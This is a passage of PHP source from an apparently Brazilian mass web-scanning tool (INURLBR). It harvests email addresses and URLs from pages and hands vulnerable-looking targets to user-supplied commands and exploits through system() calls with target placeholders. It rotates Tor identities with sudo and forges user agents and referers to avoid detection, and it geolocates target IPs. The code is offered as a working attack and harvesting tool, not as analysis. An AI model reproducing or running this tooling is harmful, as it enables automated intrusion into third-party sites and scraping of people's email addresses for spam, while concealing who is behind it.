        $busca = explode(',', $validar);
        for ($i = 0; $i <= count($busca); $i++) {
            if (in_array($busca[$i], $array)) {
                return TRUE;
            }
        }
    } else {
        for ($i = 0; $i <= count($array); $i++) {
            if (strstr($validar, $array[$i])) {
                return TRUE;
            }
        }
    }
    return FALSE;
}

################################################################################
#VALIDATE OPERATING SYSTEM AND COLOR SYSTEM#####################################
################################################################################

function __OS() {

    $sistema = strtoupper(PHP_OS);
    if (substr($sistema, 0, 3) == "WIN") {
        $i = 0;
        system("cls");
        $_SESSION["os"] = 1;
        while ($i <= 17) {
            $_SESSION["c{$i}"] = NULL;
            $i++;
        }
    } else {
        system("command clear");
        //DEFINING COLORS
        $_SESSION["c0"] = "\033[0m";      // END OF COLOR
        $_SESSION["c1"] = "\033[1;37m";   // WHITE
        $_SESSION["c2"] = "\033[1;33m";   // YELLOW
        $_SESSION["c3"] = "\033[1;31m";   // RED LIGHT
        $_SESSION["c4"] = "\033[32m";   // GREEN 
        $_SESSION["c5"] = "\033[1;32m";   // GREEN LIGHT
        $_SESSION["c6"] = "\033[0;35m";   // PURPLE
        $_SESSION["c7"] = "\033[1;30m";   // DARK GREY
        $_SESSION["c8"] = "\033[0;34m";   // BLUE
        $_SESSION["c9"] = "\033[0;37m";   // LIGHT GREY
        $_SESSION["c10"] = "\033[0;33m";  // BROWN
        $_SESSION["c11"] = "\033[1;35m";  // LIGHT PURPLE
        $_SESSION["c12"] = "\033[0;31m";  // RED
        $_SESSION["c13"] = "\033[1;36m";  // LIGHT CYAN
        $_SESSION["c14"] = "\033[0;36m";  // CIANO
        $_SESSION["c15"] = "\033[1;34m";  // LIGHT BLUE
        $_SESSION["c16"] = "\033[02;31m"; // DARK RED
    }
}

################################################################################
#SAVE URL VULNERABLE  COMMAND ECHO >> FILE######################################
################################################################################

function __saveValue($arquivo, $valor, $op = NULL) {

    $path = !not_isnull_empty($_SESSION['config']['save-as']) ? $_SESSION['config']['out_put_paste'] : NULL;
    echo ($op == 1) ?
            "\n{$_SESSION["c1"]}|_[ + ]{$_SESSION["c7"]} VALUE SAVED IN THE FILE::{$_SESSION["c9"]} {$arquivo}{$_SESSION["c0"]}" : NULL;
    file_put_contents(($op == 2) ? $arquivo : $path . $arquivo, "{$valor}\n", FILE_APPEND);
}

################################################################################
#CAPTURE ID KEY TO SEARCH LYCOS MAKE############################################
################################################################################

function __getIdSearchLycos($html) {

    $match = NULL;
    preg_match_all("(val.*)", $html, $match);
    return (str_replace(');', '', str_replace('val(', '', str_replace("'", '', $match[0][4]))));
}

################################################################################
#RENEW IP NETWORK TOR###########################################################
################################################################################

function __renewTOR() {

    system("[ -z 'pidof tor' ] || pidof tor | xargs sudo kill -HUP;");
    $request__ = __request_info('http://dynupdate.no-ip.com/ip.php', $_SESSION["config"]["proxy"]);
    __plus();
    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ IP NETWORK TOR RENEWED ]::: {$_SESSION["c1"]}[ {$request__['corpo'] } ]\n{$_SESSION["c0"]}";
    /* https://pt.wikipedia.org/wiki/Pidof
     * pidof é um utilitário Linux que encontra o ID de um programa em execução.
     * Note que o próprio nome é a junção dos termos pid, que significa identidade
     * de um processo e of que significa de. Portanto pidof quer dizer identidade 
     * de processo de...
     * O equivalente no Solaris é pgrep. pidof firefox-bin O commando acima retorna 
     * o pid do processo que está executando firefox-bin.
     * Pode-se combinar o commando 'pidof' com o commando kill dessa forma:
     * kill -9 $(pidof firefox-bin) pidof é simplesmente uma ligação simbólica 
     * para o programa killall5,que está localizado em /sbin.
     */
}

################################################################################
#This function will validate emails#############################################
################################################################################

function __validateEmail($email) {

    $conta = "^[a-zA-Z0-9\._-]+@";
    $domino = "[a-zA-Z0-9\._-]+.";
    $extensao = "([a-zA-Z]{2,4})$";

    $pattern = $conta . $domino . $extensao;

    return (ereg($pattern, $email)) ? TRUE : FALSE;
}

################################################################################
#This function will validate URLS###############################################
################################################################################

function __validateURL($url) {

    if (preg_match("#\b(http[s]?://|ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si", $url)) {
        return TRUE;
    } else {
        return FALSE;
    }
}

################################################################################
#This function will filter custom values########################################
################################################################################

function __extractRegCustom($html, $url_) {

    $matches = NULL;
    __plus();
    preg_match_all("#\b{$_SESSION['config']['regexp-filter']}#i", $html, $matches);

    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]} |_[ URL ] {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";

    $matches_ = array_filter(array_unique(array_unique($matches[0])));
    foreach ($matches_ as $valor) {

        if (not_isnull_empty($valor)) {

            echo "{$_SESSION["c1"]}__[ + ] {$_SESSION["c0"]}[\033[01;31m {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]- {$valor}\n";
            $_SESSION["config"]["resultado_valores"].="{$valor}\n";
            __plus();
            __saveValue($_SESSION["config"]["arquivo_output"], $valor);
            $_SESSION['config']['cont_valores'] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function will filter and mail each url####################################
################################################################################

function __filterEmailif($resultados) {

    if (is_array($resultados)) {
        echo "{$_SESSION["c1"]}|_[ ! ][ INFO ]{$_SESSION["c16"]}[ FILTERING VALUE ]::{$_SESSION["c1"]}[ {$_SESSION["config"]['ifemail']} ]{$_SESSION["c0"]}\n";
        foreach ($resultados as $value) {

            $temp[] = (strstr($value, $_SESSION['config']['ifemail']) ? $value : NULL);
        }

        return array_unique(array_filter($temp));
    }

    RETURN FALSE;
}

################################################################################
#This function extract emails###################################################
################################################################################

function __extractEmail($html, $url_) {

    $matches = NULL;
    __plus();
    preg_match_all('/([\w\d\.\-\_]+)@([\w\d\.\_\-]+)/mi', $html, $matches);
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]}|_[ ! ][ INFO ][URL] :: {$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";

    $_matches = array_filter(array_unique(array_unique($matches[0])));
    $matches_ = (not_isnull_empty($_SESSION['config']['ifemail']) ? __filterEmailif($_matches) : $_matches);

    foreach ($matches_ as $valor) {

        if (__validateEmail($valor)) {

            echo "{$_SESSION["c1"]}|_[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]- {$valor} "
            . (filter_var($valor, FILTER_VALIDATE_EMAIL) ?
                    "{$_SESSION["c14"]}[ OK ]{$_SESSION["c0"]}" : "{$_SESSION["c16"]}[ NO ]{$_SESSION["c0"]}") . "\n";
            (filter_var($valor, FILTER_VALIDATE_EMAIL) ? $_SESSION["config"]["resultado_valores"].="{$valor}\n" : NULL);
            __plus();
            (filter_var($valor, FILTER_VALIDATE_EMAIL) ? __saveValue($_SESSION["config"]["arquivo_output"], $valor) : NULL);

            $_SESSION['config']['cont_valores'] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function will filter urls each url########################################
################################################################################

function __extractURLs($html, $url_) {

    $matches = NULL;
    __plus();
    $reg_tag = 'href=\"|src=\"|value=\"';
    $reg = "#\b({$reg_tag}http[s]?://|{$reg_tag}ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si";
    preg_match_all($reg, $html, $matches);
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]} |_[ INFO ][URL] {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    $matches_ = array_unique(array_filter($matches[0]));
    $blacklist = $_SESSION["config"]['blacklist'];
    $blacklist_ = (isset($_SESSION["config"]["webcache"])) ? str_replace('webcache.,', '', $blacklist) : $blacklist;

    foreach ($matches_ as $valor) {

        $valor = __filterURLTAG($valor);
        if (__validateURL($valor) && !__validateOptions($blacklist_, $valor, 1)) {
            echo "{$_SESSION["c1"]}__[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION["config"]['cont_url']}"
            . " {$_SESSION["c9"]}]- {$valor}{$_SESSION["c0"]}\n";
            $_SESSION["config"]["resultado_valores"].="{$valor}\n";
            __plus();
            __saveValue($_SESSION["config"]["arquivo_output"], $valor) . __plus();
            $_SESSION["config"]["cont_url"] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function removes the last regular expression ta###########################
################################################################################

function __filterURLTAG($valor = NULL) {

    return(!is_null($valor)) ? str_replace('"', '', str_replace('href="', '', str_replace('src="', '', str_replace('value="', '', $valor)))) : NULL;
}

################################################################################
#Esta função irá formatar salvar urls concatenadas##############################
################################################################################

function __checkURLs($resultado, $url_) {

    __plus();
    $code = !is_null($_SESSION["config"]["ifcode"]) ? $_SESSION["config"]["ifcode"] : 200;
    $valor = ($resultado['server']['http_code'] == $code) ? "{$_SESSION["c4"]}" : NULL;

    echo "\n{$_SESSION["c1"]}  |_[ INFO ]{$_SESSION["c0"]}[{$_SESSION["c1"]} {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]\n";
    echo "{$_SESSION["c1"]}  |_[ INFO ][URL] {$_SESSION["c0"]}::{$_SESSION["c9"]}{$valor} {$url_} {$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]}  |_[ INFO ][STATUS]::{$valor} {$resultado['server']['http_code']} {$_SESSION["c0"]}\n";

    __timeSec('delay');
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}";
    __plus();

    $target_ = array('url_clean' => $url_, 'url_xpl' => $url_);

    if ($resultado == $code) {

        $_SESSION['config']['resultado_valores'].= "{$url_}\n";
        __saveValue($_SESSION["config"]["arquivo_output"], $url_) . __plus();
        __plus();

        (not_isnull_empty($_SESSION['config']['sub-file']) &&
                is_array($_SESSION['config']['sub-file']) ? __subExecExploits($target_['url_xpl'], $_SESSION['config']['sub-file']) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['command-vul']) ? __command($_SESSION['config']['command-vul'], $target_) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['exploit-vul-id']) ?
                        __configExploitsExec($_SESSION['config']['exploit-vul-id'], $target_) : NULL);
        __plus();
    }

    (not_isnull_empty($_SESSION['config']['exploit-all-id']) ? __configExploitsExec($_SESSION['config']['exploit-all-id'], $target_) : NULL);
    __plus();

    (not_isnull_empty($_SESSION['config']['command-all']) ? __command($_SESSION['config']['command-all'], $target_) : NULL);
    __plus();

    $_SESSION['config']['cont_valores'] ++;

    __plus();
}

################################################################################
#This function will send the contents of the output buffer (if any)#############
################################################################################

function __plus() {

    ob_flush();
    flush();
}

################################################################################
#FORMATTING POST################################################################
################################################################################

function __convertUrlQuery($query) {

    $queryParts = explode('&', $query);
    $params = array();
    $match = array();
    foreach ($queryParts as $param) {
        $item = explode('=', $param);
        preg_match_all("([a-zA-Z0-9]=(.*))", $param, $match);
        $params[$item[0]] = ($match[1][0]);
    }

    return $params;
}

################################################################################
#OPEN FILE BASE FOR VALIDATION##################################################
################################################################################

function __openFile($arquivo, $op = NULL) {

    if (isset($arquivo) && !empty($arquivo)) {
        $resultadoURL = array_unique(array_filter(explode("\n", file_get_contents($arquivo))));

        if (is_array($resultadoURL)) {

            return ($op == 1 ? $resultadoURL : __process($resultadoURL));
        }
    }
}

################################################################################
#CATCH INFORMATION IP###########################################################
################################################################################

function __infoIP($ip, $op = 0) {

    /*
      [longitude] => 4.9
      [latitude] => 52.3667
      [asn] => AS196752
      [offset] => 2
      [ip] => 46.19.37.0
      [area_code] => 0
      [continent_code] => EU
      [dma_code] => 0
      [timezone] => Europe/Amsterdam
      [country_code] => NL
      [isp] => Tilaa B.V.
      [country] => Netherlands
      [country_code3] => NLD
     */

    preg_match_all('#\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})#si', $ip, $ip);
    if (filter_var($ip[0][0], FILTER_VALIDATE_IP)) {
        if ($op == 0) {
            $request__ = __request_info("http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
            __plus();
            return json_decode($request__['corpo'], TRUE);
        } else {
            $_SESSION['config']['verifica_info'] = NULL;
            $request__ = __request_info("http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
            $return = json_decode($request__['corpo'], TRUE);
            __plus();
            return "{$return['city']} /{$return['country']} - {$return['country_code']} /{$return['continent_code']} , ISP: {$return['isp']}";
        }
    }
}

################################################################################
#CAPTURE URL POSITION IN BROWSER ALEXA / RELEVANCE OF SUCH URL##################
################################################################################

function __positionAlexa($url) {

    $xmlSimple = simplexml_load_file("http://data.alexa.com/data?cli=10&dat=snbamz&url={$url}");
    $resultRank = $xmlSimple->SD[1];
    __plus();
    if ($resultRank) {
        $retornoRank = $resultRank->REACH->attributes()->RANK;
    } else {
        $retornoRank = 0;
    }
    return $retornoRank . __plus();
}

################################################################################
#GENERATE URL REFERENCE random##################################################
################################################################################

function __setURLReferenceRandom() {

    $dominio = array('Adzuna', 'Bixee', 'CareerBuilder', 'Craigslist', 'Dice', 'Eluta.ca', 'Hotjobs', 'JobStreet', 'Incruit', 'Indeed', 'Glassdoor', 'LinkUp', 'Monster', 'Naukri',
        'Yahoo', 'Legal', 'GoogleScholar', 'Lexis', 'Manupatra', 'Quicklaw', 'WestLaw', 'Medical', 'Bing Health', 'Bioinformatic', 'CiteAb', 'EB-eye', 'Entrez', 'mtv', 'ubuntu',
        'GenieKnows', 'GoPubMed', 'Healia', 'Healthline', 'Nextbio', 'PubGene', 'Quertle', 'Searchmedica', 'WebMD', 'News', 'BingNews', 'Daylife', 'GoogleNews', 'aol', 'microsoft',
        'MagPortal', 'Newslookup', 'Nexis', 'Topix', 'Trapit', 'YahooNews', 'People', 'Comfibook', 'Ex.plode', 'InfoSpace', 'PeekYou', 'Spock', 'Spokeo', 'WorldwideHelpers', 'iPhone',
        'Zabasearch', 'ZoomInfo', 'Fizber', 'HotPads', 'Realtor', 'Redfin', 'Rightmove', 'Trulia', 'Zillow', 'Zoopla', 'StuRents', 'globo', 'sbt', 'band', 'cnn', 'blog.inurl.com.br'
    );

    $gTLD = array('aero', 'arpa', 'biz', 'com', 'coop', 'edu', 'gov', 'info', 'int', 'mil', 'museum', 'name', 'net', 'org', 'pro', 'tel');

    $arquivo = array('admin', 'index', 'wp-admin', 'info', 'shop', 'file', 'out', 'open', 'news', 'add', 'profile', 'search', 'open', 'photo', 'insert', 'view');
    $ext = array('exe', 'php', 'asp', 'aspx', 'jsf', 'html', 'htm', 'lua', 'log', 'cgi', 'sh', 'css', 'py', 'sql', 'xml', 'rss');

    $pasta = array('App_Files', 'Assets', 'CFFileServlet', 'CFIDE', 'Communication', 'Computers', 'CoreAdminHome', 'CoreHome', 'Crawler', 'Creator',
        'DECOM', 'Dashboard', 'Drives', 'Dynamic', 'FCKeditor', 'Feedback', 'Files', 'Flash', 'Forms', 'Help', 'ICEcore', 'IO', 'Image', 'JPG', 'getold',
        'JSP', 'KFSI', 'Laguna', 'Login', 'Motors', 'MultiSites', 'NR', 'OCodger', 'RSS', 'Safety', 'Smarty', 'Software', 'Static', 'Stress', 'getfull',
        'Sugarcrm', 'Travel', 'UPLOAD', 'Urussanga', 'UserFiles', '__tpl', '_fckeditor', '_info', '_machine', '_plugins', '_sample', '_samples', 'postmost',
        '_source', '_testcases', 'aaa', 'abelardoluz', 'aberlardoluz', 'aborto', 'about', 'aboutus', 'abuse', 'abusers', 'ac_drives', 'acabamentos', 'mail',
        'academias', 'acao', 'acartpro', 'acatalog', 'acc', 'acc_auto_del', 'acc_beep_ken', 'acc_beep_time', 'acc_ch_mail', 'acc_fc_prsc', 'accounts', 'validar',
        'acc_html_mark', 'acc_html_rand', 'acc_lan_page', 'acc_pic_html', 'acc_profol', 'acc_soft_link', 'acc_ssd_page', 'acc_syun_ei', 'german', 'intranet', 'old',
        'acc_time_go', 'acc_wbcreator', 'accept', 'accepted', 'acceso', 'access', 'accessibility', 'accessories', 'acciones', 'acclg', 'account', 'paste', 'paste22',
        'acessorios', 'acontece', 'acougueiro', 'acoustic', 'act', 'action', 'activate', 'active', 'activeden', 'activism', 'actualit', 'actuators', 'ad', 'informatica',
        'ad_division', 'ad_rate', 'adapter', 'adapters', 'adaptive', 'adaptivei', 'adatmentes', 'adbanner', 'adblock', 'adboard', 'adclick', 'add-ons', 'add', 'delete',
        'added', 'addon', 'address', 'adduser', 'adfree', 'adhoc', 'adinfo', 'adios_papa', 'adlink', 'adlinks', 'acc_folder_vw', 'acc_syun_su',
    );

    $locais = array('ac', 'ad', 'ae', 'af', 'ag', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'as', 'at', 'au', 'aw', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn',
        'bw', 'by', 'bz', 'ca', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'bo', 'br',
        'ec', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'bs', 'bt',
        'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'bv',
        'kh', 'ki', 'km', 'kn', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mk', 'ml',
        'mm', 'mn', 'mo', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'nb', 'nc', 'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om',
        'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si',
        'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'ss', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tr', 'tt', 'tv',
        'tw', 'tz', 'ua', 'ug', 'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'yu', 'za', 'zm', 'zw', 'ai',
    );
    return "http://www." . strtolower($dominio[rand(0, count($dominio) - 1)]) . ".{$gTLD[rand(0, count($gTLD) - 1)]}.{$locais[rand(0, count($locais) - 1)]}/{$pasta[rand(0, count($pasta) - 1)]}/{$arquivo[rand(0, count($arquivo) - 1)]}.{$ext[rand(0, count($ext) - 1)]}";
}

################################################################################
#GENERATE AGENT BROWSER random##################################################
################################################################################

function __setUserAgentRandom() {

    $agentBrowser = array('Firefox', 'Safari', 'Opera', 'Flock', 'Internet Explorer', 'Seamonkey', 'Tor Browser', 'GNU IceCat', 'CriOS', 'TenFourFox',
        'SeaMonkey', 'B-l-i-t-z-B-O-T', 'Konqueror', 'Mobile', 'Konqueror', 'Netscape', 'Chrome', 'Dragon', 'SeaMonkey', 'Maxthon', 'IBrowse',
        'K-Meleon', 'GoogleBot', 'Konqueror', 'Minimo', 'Googlebot', 'WeltweitimnetzBrowser', 'SuperBot', 'TerrawizBot', 'YodaoBot', 'Wyzo', 'Grail',
        'PycURL', 'Galaxy', 'EnigmaFox', '008', 'ABACHOBot', 'Bimbot', 'Covario IDS', 'iCab', 'KKman', 'Oregano', 'WorldWideWeb', 'Wyzo', 'GNU IceCat',
        'Vimprobable', 'uzbl', 'Slim Browser', 'Flock', 'OmniWeb', 'Rockmelt', 'Shiira', 'Swift', 'Pale Moon', 'Camino', 'Flock', 'Galeon', 'Sylera'
    );

    $agentSistema = array('Windows 3.1', 'Windows 95', 'Windows 98', 'Windows 2000', 'Windows NT', 'Linux 2.4.22-10mdk', 'FreeBSD',
        'Windows XP', 'Windows Vista', 'Redhat Linux', 'Ubuntu', 'Fedora', 'AmigaOS', 'BackTrack Linux', 'iPad', 'BlackBerry', 'Unix',
        'CentOS Linux', 'Debian Linux', 'Macintosh', 'Android', 'iPhone', 'Windows NT 6.1', 'BeOS', 'OS 10.5', 'Nokia', 'Arch Linux',
        'Ark Linux', 'BitLinux', 'Conectiva (Mandriva)', 'CRUX Linux', 'Damn Small Linux', 'DeLi Linux', 'Ubuntu', 'BigLinux', 'Edubuntu',
        'Fluxbuntu', 'Freespire', 'GNewSense', 'Gobuntu', 'gOS', 'Mint Linux', 'Kubuntu', 'Xubuntu', 'ZeVenOS', 'Zebuntu', 'DemoLinux',
        'Dreamlinux', 'DualOS', 'eLearnix', 'Feather Linux', 'Famelix', 'FeniX', 'Gentoo', 'GoboLinux', 'GNUstep', 'Insigne Linux',
        'Kalango', 'KateOS', 'Knoppix', 'Kurumin', 'Dizinha', 'TupiServer', 'Linspire', 'Litrix', 'Mandrake', 'Mandriva', 'MEPIS',
        'Musix GNU Linux', 'Musix-BR', 'OneBase Go', 'openSuSE', 'pQui Linux', 'PCLinuxOS', 'Plaszma OS', 'Puppy Linux', 'QiLinux',
        'Red Hat Linux', 'Red Hat Enterprise Linux', 'CentOS', 'Fedora', 'Resulinux', 'Rxart', 'Sabayon Linux', 'SAM Desktop', 'Satux',
        'Slackware', 'GoblinX', 'Slax', 'Zenwalk', 'SuSE', 'Caixa Mágica', 'HP-UX', 'IRIX', 'OSF/1', 'OS-9', 'POSYS', 'QNX', 'Solaris',
        'OpenSolaris', 'SunOS', 'SCO UNIX', 'Tropix', 'EROS', 'Tru64', 'Digital UNIX', 'Ultrix', 'UniCOS', 'UNIflex', 'Microsoft Xenix',
        'z/OS', 'Xinu', 'Research Unix', 'InfernoOS'
    );

    $locais = array('cs-CZ', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'ar_JO',
        'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'ar_SY', 'ar_TN', 'ar_AE', 'ar_YE', 'ar',
        'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs',
        'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA',
        'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE',
        'de_LU', 'de_CH', 'de', 'el_CY', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'in', 'ga_IE',
        'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY',
        'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME',
        'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV',
        'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE',
        'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk', 'vi_VN', 'vi'
    );
    return $agentBrowser[rand(0, count($agentBrowser) - 1)] . '/' . rand(1, 20) . '.' . rand(0, 20) . ' (' . $agentSistema[rand(0, count($agentSistema) - 1)] . ' ' . rand(1, 7) . '.' . rand(0, 9) . '; ' . $locais[rand(0, count($locais) - 1)] . ';)';
}

################################################################################
#RESPONSIBLE FOR RUN COMMANDS IN TERMINAL the installation of facilities########
################################################################################

function __installDepencia() {

    echo __bannerlogo() . __plus();
    echo "\n{$_SESSION["c15"]}|_[ * ]__{$_SESSION["c0"]}\n";
    echo "         {$_SESSION["c15"]}|[EXTERNAL COMMAND INSTALLING PREMISES ]:: {$_SESSION["c11"]}\n";
    $dados = system("sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl", $dados) . __plus();
    sleep(1) . __plus();
    echo "{$_SESSION["c0"]}";
    if (empty($dados)) {

        return FALSE;
    }
    unset($dados);
    exit();
}

################################################################################
#RESPONSIBLE FOR RUN COMMANDS IN TERMINAL#######################################
################################################################################

function __command($commando, $alvo) {

    if (!is_null($commando)) {

        (strstr($commando, '_TARGET_') ||
                strstr($commando, '_TARGETFULL_') ||
                strstr($commando, '_TARGETIP_') ||
                strstr($commando, '_EXPLOIT_') ||
                strstr($commando, '_URI_') ||
                strstr($commando, '_URI_') ||
                strstr($commando, '_PORT_') ||
                strstr($commando, '_RANDOM_') ? NULL :
                        __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c2"]}SET PARAMETER - command correctly{$_SESSION["c0"]}\n"));

        $uri = parse_url($alvo['url_xpl']);

        $command[0] = str_replace("_TARGET_", "{$_SESSION["c8"]}" . __filterHostname($alvo['url_xpl']) . "{$_SESSION["c1"]}", $commando);
        $command[0] = str_replace('_TARGETIP_', "{$_SESSION["c9"]}{$_SESSION['config']['server_ip']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_TARGETFULL_', "{$_SESSION["c14"]}{$alvo['url_clean']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_TARGETXPL_', "{$_SESSION["c14"]}{$alvo['url_xpl']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace("_EXPLOIT_", "{$_SESSION["c6"]}{$_SESSION['config']['exploit-command']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_URI_', "{$_SESSION["c8"]}{$uri['path']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_PORT_', "{$_SESSION["c9"]}{$alvo['url_port']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_RANDOM_', "{$_SESSION["c15"]}" . random(5) . "{$_SESSION["c1"]}", $command[0]);

        $command[0] = __crypt($command[0]);

        $command[1] = str_replace("_TARGET_", __filterHostname($alvo['url_clean']), $commando);
        $command[1] = str_replace('_TARGETIP_', $_SESSION['config']['server_ip'], $command[1]);
        $command[1] = str_replace('_TARGETFULL_', $alvo['url_clean'], $command[1]);
        $command[1] = str_replace('_TARGETXPL_', $alvo['url_xpl'], $command[1]);
        $command[1] = str_replace("_EXPLOIT_", $_SESSION['config']['exploit-command'], $command[1]);
        $command[1] = str_replace("_URI_", $uri['path'], $command[1]);
        $command[1] = str_replace("_PORT_", $alvo['url_port'], $command[1]);
        $command[1] = str_replace("_RANDOM_", random(5), $command[1]);
        $command[1] = str_replace("\n", '', str_replace("\r", '', $command[1]));

        $command[1] = __crypt($command[1]);

        echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
        echo "         |[ EXTERNAL COMMAND ]:: {$command[0]}{$_SESSION["c11"]}\n";
        $_ = array(0 => ($_SESSION['config']['popup']) ? 'sudo xterm -geometry 134x50+1900+0 -title "Auxiliary Window - INURLBR / COMMAND" -e ' : NULL, 1 => ($_SESSION['config']['popup']) ? ' > /dev/null &' : NULL);
        echo ($_SESSION['config']['popup'] ? "\t[!] opening auxiliary window...\n" : NULL);
        $dados = system($_[0] . $command[1] . $_[1], $dados);
        sleep(1) . __plus();

        echo $_SESSION["c0"];
    }
    if (empty($dados[0])) {

        return FALSE;
    }
    unset($dados);
}

################################################################################
#FILTER BY TAKING ONLY RESPONSIBLE URL HOSTNAME#################################
################################################################################

function __filterHostname($url) {

    $alvo_ = NULL;
    //#\b((((ht|f)tps?://*)|(www|ftp)\.)[a-zA-Z0-9-\.]+)#i - 1.0
    preg_match_all('@^(?:(ht|f)tps?://*)?([^/]+)@i', $url, $alvo_);
    return str_replace("/", '', str_replace("ftps:", '', str_replace("ftp:", '', str_replace("https:", '', str_replace("http:", '', $alvo_[0][0])))));
}

################################################################################
#RESPONSIBLE FOR ALL REQUESTS GET / POST THE SCRIPT#############################
################################################################################
/*
  curl_multi_init — Returns a new cURL multi handle
